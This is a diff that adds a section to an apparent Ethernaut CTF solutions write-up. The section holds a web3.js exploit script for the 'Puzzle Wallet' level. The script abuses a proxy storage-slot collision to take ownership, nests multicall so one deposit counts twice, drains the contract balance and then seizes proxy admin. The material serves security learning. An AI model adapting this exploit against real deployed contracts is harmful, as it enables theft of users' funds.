@@ -273,3 +273,34 @@ Compile [SwappableTokenThree.sol](./solutions/SwappableTokenThree.sol) and deplo
 Do not forget to specify the level `instance` address when deploying the token contract (constructor).  
 Afterwards, just call the `drainDex()` function of our malicious token.
 
+
+## 24. Puzzle Wallet
+
+```
+// become owner of PuzzeWallet, because storage slot overlaps with pendingAdmin of PuzzleProxy
+const proposeSig = web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)");
+const proposeParam = web3.eth.abi.encodeParameter("address", player);
+const proposeData = proposeSig + proposeParam.slice(2);
+await web3.eth.sendTransaction({ from: player, to: contract.address, data: proposeData });
+
+// whitelist player because player = owner already
+await contract.addToWhitelist(player);
+
+// build call "multicall([ deposit(), multicall([ deposit() ]) ])" to deposit msg.value twice
+const depositSig = web3.eth.abi.encodeFunctionSignature("deposit()");
+const multicallSig = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])");
+const innerMulticallParam = web3.eth.abi.encodeParameter("bytes[]", [ depositSig ]);
+const innerMulticallData = multicallSig + innerMulticallParam.slice(2);
+const outerMulticallParam = web3.eth.abi.encodeParameter("bytes[]", [ depositSig, innerMulticallData ]);
+const outerMulticallData = multicallSig + outerMulticallParam.slice(2);
+
+// deposit contract balance "twice"
+const contractBalance = await web3.eth.getBalance(contract.address);
+await web3.eth.sendTransaction({ from: player, to: contract.address, data: outerMulticallData, value: contractBalance });
+
+// drain contract
+await contract.execute(player, 2*contractBalance, []);
+
+// become admin of PuzzleProxy, because storage slot overlaps with maxBalance of PuzzeWallet
+await contract.setMaxBalance(player);
+```
